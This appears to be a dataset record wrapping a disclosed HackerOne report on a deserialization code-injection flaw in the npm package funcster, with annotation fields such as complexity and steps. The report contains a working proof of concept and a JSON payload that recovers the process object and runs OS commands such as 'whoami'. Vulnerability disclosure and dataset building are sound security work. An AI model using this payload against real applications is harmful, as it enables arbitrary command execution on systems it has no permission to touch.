@@ -1,0 +1,49 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "greendog ",
+  "title": "Insecure implementation of deserialization in funcster",
+  "content": "\nI would like to report code injection in serialization package funcster.\nIt allows execute arbitrary code during deserialization of JSON.\nModule\nmodule name: funcster\nversion: 0.0.3\nnpm page: https://www.npmjs.com/package/funcster\nModule Description\nThis library contains utilities for serializing and deserializing functions. It provides recursive traversal to discover both serialized and unserialized functions nested within objects and arrays. This is particularly useful for embedding functions into JSON objects.\nModule Stats\n4 downloads in the last week\nVulnerability\nVulnerability Description\nIn an application uses \"funcster\" package to deserialize JSON into object and if an attacker controls this JSON, then an attacker can get arbitrary code execution in the application.\nThe package reconstructs an object with functions from JSON. But it's supposed that functions of the object are not executed until they are invoked directly in the code later. Using IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization process.\nSteps To Reproduce:\nThe vulnerability exists because during deserialization process funcster creates a new module with exported functions from JSON. Here is this part of code:\nCode 80 Bytes\n1return \"module.exports=(function(module,exports){return{\" + entries + \"};})();\";\nUsing IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization. The idea is similar to one described in this article - https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/\nHere is a PoC:\nCode 232 Bytes\n1var funcster = require('funcster');\n2var serJSON = { __js_function: 'function testa(){var pr = this.constructor.constructor(\"return process\")(); pr.stdout.write(\"param-pam-pam\") }()' }\n3var newFunc = funcster.deepDeserialize(serJSON);\nfuncster cuts standard built-in objects, but we can bring them back using the global object(this) and the \"process\" object.\nHere is a JSON payload to get OS command execution(whoami):\nCode 1.51 KiB\n1 { __js_function: \"function testa(){var process = this.constructor.constructor('return process')(); spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}/*process.stdout.write(JSON.stringify(a))*/;var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};var x= spawnSync('whoami'); process.stdout.write(x.output.toString());}()\"}\nPatch\nI see no ways to patch it because it is a consequence of design/approach which funster uses to serialize/deserialize object.\nSupporting Material/References:\nUbuntu 16.04\nnode v6.11.3\nnpm 5.5.1\nWrap up\nI contacted the maintainer to let them know: N\nI opened an issue in the related repository: N\nImpact\nAn attacker can craft a special JSON file with malicious code which will be executed during deserialization by funcster. So the attacker can achieve OS command execution.\n\n",
+  "severity": [
+    8.7,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Code Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1529113680,
+  "report_url": "https://hackerone.com/reports/350401",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the funcster package: `npm install funcster`"
+    ],
+    [
+      2,
+      "Create a malicious JSON payload with an IIFE (Immediately-Invoked Function Expression) that executes arbitrary code during deserialization"
+    ],
+    [
+      3,
+      "Use the funcster.deepDeserialize method to deserialize the malicious JSON payload, triggering the code execution"
+    ]
+  ],
+  "vuln_description": "The funcster package allows arbitrary code execution during deserialization of JSON due to its insecure implementation of function deserialization. An attacker can craft a malicious JSON payload with an IIFE that executes code during the deserialization process, leading to remote code execution.",
+  "reason": "The vulnerability requires understanding of JavaScript's function serialization/deserialization, IIFE exploitation, and the specific implementation details of the funcster package. The attack involves crafting a non-trivial payload that bypasses built-in object restrictions to achieve code execution.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves deserialization of JSON data leading to arbitrary code execution, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to this deserialization vulnerability.",
+    "is_detectable": false
+  }
+}
